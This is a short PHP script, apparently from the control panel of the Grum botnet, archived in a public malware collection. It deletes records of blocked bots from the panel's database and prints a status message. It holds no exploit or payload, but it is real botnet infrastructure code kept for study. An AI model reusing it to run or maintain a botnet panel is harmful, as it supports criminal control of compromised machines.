/*
  name      Grum
  type      botnet
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
<?
    
    include("cfg.php");
        
    $sql = "delete from robo WHERE `bl` = '1';";
    $result = @mysql_query($sql);    
    
    echo "REFRESH BLOCKED";
        
?>

